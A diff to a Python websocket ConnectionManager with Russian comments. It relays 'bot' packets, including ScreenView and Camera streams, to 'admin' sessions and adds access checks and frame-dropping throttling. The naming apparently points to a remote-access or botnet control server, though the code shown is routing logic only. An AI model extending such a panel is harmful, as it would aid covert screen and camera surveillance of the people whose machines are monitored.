@@ -50,50 +50,61 @@ class ConnectionManager:
     def broadcast_packet_sync(self, packet: bytes) -> None:
         """
         Разбор заголовка V8.0 и интеллектуальная рассылка пакета целевым админам.
+        Оптимизировано для сквозного проброса ScreenView.
         """
         if len(packet) < 8:
             return
 
-        # Извлекаем длины сегментов по протоколу V8.0
-        id_len = packet[0]
-        mod_body_len = int.from_bytes(packet[1:3], "big")
-        
         try:
-            # Извлекаем ID отправителя
-            bot_id = packet[8 : 8 + id_len].decode(errors="ignore")
-            # Извлекаем метаданные для проверки "тяжести" пакета
-            meta_raw = packet[8 + id_len : 8 + id_len + mod_body_len].decode(errors="ignore")
-        except Exception:
-            return
+            # Извлекаем длины сегментов напрямую из байт
+            id_len = packet[0]
+            mod_body_len = int.from_bytes(packet[1:3], "big")
+            
+            # Извлекаем ID для проверки доступа
+            bot_id_raw = packet[8 : 8 + id_len]
+            bot_id = bot_id_raw.decode(errors="ignore").strip('\x00').strip()
+            
+            # Извлекаем метаданные (модуль/команда) для определения типа трафика
+            # Это необходимо для работы троттлинга (очистки очереди при лагах)
+            meta_slice = packet[8 + id_len : 8 + id_len + mod_body_len].decode(errors="ignore")
+            
+            # Проверка на медиа-контент: ScreenView пролетает здесь
+            is_heavy = any(tag in meta_slice for tag in ["Preview", "ScreenView", "Screen", "Camera", "Frame"])
 
-        # Логика троттлинга: проверяем модуль в метаданных (V8.0: "Module:Type:Action:Extra")
-        is_heavy = any(tag in meta_raw for tag in ["Preview", "Screen", "Camera", "Frame"])
+            sent_count = 0
+            for websocket, user_info in self.active_sessions.items():
+                # Централизованная проверка доступа
+                if bot_id == "SERVER" or NetworkProtocol.has_access(user_info, bot_id):
+                    self._push_to_queue(websocket, packet, is_heavy)
+                    sent_count += 1
+            
+            if is_heavy and sent_count == 0:
+                 logger.Log.warning(f"[MGR] Heavy packet (ScreenView/Preview) from {bot_id} dropped: no active admins")
 
-        # Рассылка всем подходящим админам
-        for websocket, user_info in self.active_sessions.items():
-            # Проверка доступа через NetworkProtocol (Admin видит всё, User по префиксу)
-            # Если пакет от "SERVER", он проходит глобально, но фильтруется по логике SystemState
-            if bot_id == "SERVER" or NetworkProtocol.has_access(user_info, bot_id):
-                self._push_to_queue(websocket, packet, is_heavy)
+        except Exception as e:
+            logger.Log.error(f"[MGR] Packet parse error during broadcast: {e}")
 
     def _push_to_queue(self, websocket: Any, packet: bytes, is_heavy: bool) -> None:
-        """Добавление пакета в очередь конкретного сокета с троттлингом."""
+        """Добавление пакета в очередь конкретного сокета с троттлингом для видеопотока."""
         queue = self.queues.get(websocket)
         if not queue:
             return
 
-        # Если стрим забивает канал, выкидываем старые кадры
+        # Если стрим (ScreenView) забивает канал, выкидываем старые кадры пачкой
         if is_heavy and queue.full():
             try:
-                for _ in range(10):
+                # Выкидываем до 20 старых пакетов, чтобы освободить место под свежий кадр
+                for _ in range(20):
                     if not queue.empty():
                         queue.get_nowait()
+                        queue.task_done()
             except Exception:
                 pass
 
         try:
             queue.put_nowait(packet)
         except asyncio.QueueFull:
+            # Если даже после очистки очередь полна (очень медленный клиент)
             pass
 
     async def _writer(self, websocket: Any, queue: asyncio.Queue) -> None:
